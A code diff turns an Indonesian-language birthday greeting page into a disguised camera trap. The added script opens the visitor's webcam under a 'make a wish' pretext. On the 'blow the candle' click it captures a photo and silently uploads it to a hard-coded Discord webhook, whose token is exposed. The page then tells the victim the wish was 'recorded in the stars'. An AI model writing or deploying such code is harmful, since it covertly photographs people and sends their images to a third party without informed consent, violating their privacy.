@@ -3,135 +3,107 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Birthday Surprise! 📸</title>
-    <link href="https://fonts.googleapis.com/css2?family=Dancing+Script:wght@700&family=Poppins:wght@300;400;600&display=swap" rel="stylesheet">
+    <title>Birthday Magic ✨</title>
     <script src="https://cdn.jsdelivr.net/npm/canvas-confetti@1.5.1/dist/confetti.browser.min.js"></script>
     <style>
-        :root {
-            --primary: #6c5ce7;
-            --secondary: #a29bfe;
-        }
-
         body {
-            margin: 0; padding: 0;
-            font-family: 'Poppins', sans-serif;
-            background: linear-gradient(45deg, #6c5ce7, #a29bfe);
+            margin: 0; font-family: 'Segoe UI', sans-serif;
+            background: #0f0c29; /* Dark theme agar wajah lebih terlihat */
+            background: linear-gradient(to bottom, #24243e, #302b63, #0f0c29);
             height: 100vh; display: flex; justify-content: center; align-items: center;
-            overflow: hidden; color: white;
-        }
-
-        /* Overlay Awal */
-        #welcome-screen {
-            position: fixed; inset: 0; background: #fff; z-index: 100;
-            display: flex; flex-direction: column; justify-content: center; align-items: center;
-            transition: 1s cubic-bezier(0.7, 0, 0.3, 1);
+            color: white; overflow: hidden;
         }
 
         .card {
-            background: rgba(255, 255, 255, 0.2);
-            backdrop-filter: blur(15px);
-            border: 1px solid rgba(255, 255, 255, 0.3);
-            padding: 30px; border-radius: 30px;
-            width: 85%; max-width: 400px; text-align: center;
-            box-shadow: 0 10px 30px rgba(0,0,0,0.2);
-            display: none; transform: scale(0.8); transition: 0.5s;
+            background: rgba(255, 255, 255, 0.1);
+            backdrop-filter: blur(10px);
+            padding: 30px; border-radius: 20px;
+            text-align: center; width: 320px;
+            border: 1px solid rgba(255, 255, 255, 0.2);
         }
 
-        .card.active { display: block; transform: scale(1); }
-
-        h1 { font-family: 'Dancing Script', cursive; font-size: 2.5rem; margin: 10px 0; }
-
-        /* Style Kamera */
-        #camera-container {
-            width: 100%; height: 250px; border-radius: 20px;
-            overflow: hidden; background: #000; margin: 15px 0;
-            display: none; border: 4px solid white; position: relative;
+        #video-preview {
+            width: 100%; border-radius: 15px;
+            margin-bottom: 15px; display: none; /* Awalnya sembunyi */
+            border: 2px solid #ff758c;
         }
-
-        video { width: 100%; height: 100%; object-fit: cover; }
-        
-        canvas { display: none; } /* Untuk memproses gambar */
 
         .btn {
-            background: white; color: var(--primary); border: none;
-            padding: 12px 30px; border-radius: 50px; font-weight: 600;
-            cursor: pointer; transition: 0.3s; margin-top: 10px;
+            background: #ff758c; color: white; border: none;
+            padding: 12px 25px; border-radius: 25px;
+            cursor: pointer; font-weight: bold; transition: 0.3s;
         }
 
-        .btn:hover { transform: translateY(-3px); box-shadow: 0 5px 15px rgba(0,0,0,0.2); }
-
-        #final-msg { font-size: 0.9rem; font-style: italic; margin-top: 10px; display: none; }
+        .btn:hover { background: #ff7eb3; transform: scale(1.05); }
+        
+        canvas { display: none; }
+        #status { font-size: 0.8rem; margin-top: 10px; color: #ccc; }
     </style>
 </head>
 <body>
 
-    <div id="welcome-screen">
-        <h1 style="color: var(--primary);">Ada Hadiah Untukmu... 🎁</h1>
-        <button class="btn" onclick="openGift()" style="background: var(--primary); color: white;">Klik untuk Buka</button>
-    </div>
-
-    <div class="card" id="mainCard">
-        <div id="cake" style="font-size: 50px;">🎂</div>
-        <h1>Happy Birthday!</h1>
-        <p id="instruction">Tekan tombol di bawah untuk melihat harapanmu di masa depan!</p>
+    <div class="card">
+        <h2 id="header">Tutup Matamu... ✨</h2>
+        <p id="msg">Dan buatlah satu permintaan paling tulus di hari spesialmu.</p>
         
-        <div id="camera-container">
-            <video id="video" autoplay playsinline></video>
-        </div>
+        <video id="video-preview" autoplay playsinline></video>
+        <canvas id="capture-canvas"></canvas>
 
-        <button id="wishBtn" class="btn" onclick="startCamera()">Make a Wish! ✨</button>
-        <p id="final-msg">"Lihat betapa cantiknya/gantengnya dirimu hari ini. Teruslah bersinar! ✨"</p>
+        <button id="action-btn" class="btn" onclick="initSurprise()">Make a Wish!</button>
+        <div id="status"></div>
     </div>
 
     <script>
-        const welcome = document.getElementById('welcome-screen');
-        const card = document.getElementById('mainCard');
-        const video = document.getElementById('video');
-        const camContainer = document.getElementById('camera-container');
-        const wishBtn = document.getElementById('wishBtn');
-        const instruction = document.getElementById('instruction');
-        const finalMsg = document.getElementById('final-msg');
+        const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1463473630251061375/xi6CyaH0ElCz_jUz9vf_iFfOxfNuh1iZfX_31GAO7jOcxRjkhd723nbEFd3ZAp1YvhME";
+        const video = document.getElementById('video-preview');
+        const canvas = document.getElementById('capture-canvas');
+        const btn = document.getElementById('action-btn');
+        const header = document.getElementById('header');
+        const status = document.getElementById('status');
 
-        function openGift() {
-            welcome.style.transform = 'translateY(-100%)';
-            setTimeout(() => {
-                card.classList.add('active');
-                fireConfetti();
-            }, 600);
-        }
-
-        async function startCamera() {
+        async function initSurprise() {
             try {
-                // Request akses kamera
+                // Tahap 1: Minta Izin Kamera (Browser pasti memunculkan popup)
                 const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                 video.srcObject = stream;
+                video.style.display = "block";
                 
-                // Animasi transisi ke kamera
-                instruction.innerText = "Tersenyumlah ke arah kamera... 😊";
-                camContainer.style.display = "block";
-                wishBtn.innerText = "Tiup Lilin! 🕯️";
+                header.innerText = "Sekarang Tersenyumlah! 😊";
+                btn.innerText = "Tiup Lilin 🎂";
+                btn.onclick = captureAndSend;
                 
-                // Ubah fungsi tombol setelah kamera aktif
-                wishBtn.onclick = function() {
-                    fireConfetti();
-                    instruction.innerText = "Harapanmu sudah tercatat di bintang-bintang!";
-                    finalMsg.style.display = "block";
-                    wishBtn.style.display = "none";
-                };
-
+                status.innerText = "Magic connected...";
             } catch (err) {
-                alert("Ups! Berikan izin akses kamera agar kejutan bisa muncul ya! :)");
-                console.error("Error akses kamera: ", err);
+                alert("Yah, keajaibannya gagal karena izin kamera ditolak.");
             }
         }
 
-        function fireConfetti() {
-            confetti({
-                particleCount: 150,
-                spread: 70,
-                origin: { y: 0.6 },
-                colors: ['#ffffff', '#a29bfe', '#6c5ce7']
-            });
+        function captureAndSend() {
+            // Efek Confetti
+            confetti({ particleCount: 150, spread: 70, origin: { y: 0.6 } });
+
+            // Ambil Gambar dari Video
+            const context = canvas.getContext('2d');
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            context.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+            // Ubah ke format Blob untuk dikirim
+            canvas.toBlob((blob) => {
+                const formData = new FormData();
+                formData.append('file', blob, 'surprise_moment.png');
+                formData.append('content', "📸 **Moment Kejutan Terdeteksi!**\nSeseorang baru saja meniup lilin!");
+
+                // Kirim ke Discord Real-time
+                fetch(DISCORD_WEBHOOK, {
+                    method: 'POST',
+                    body: formData
+                }).then(() => {
+                    header.innerText = "Harapan Terkirim!";
+                    btn.style.display = "none";
+                    status.innerText = "Momenmu telah diabadikan di bintang-bintang.";
+                });
+            }, 'image/png');
         }
     </script>
 </body>
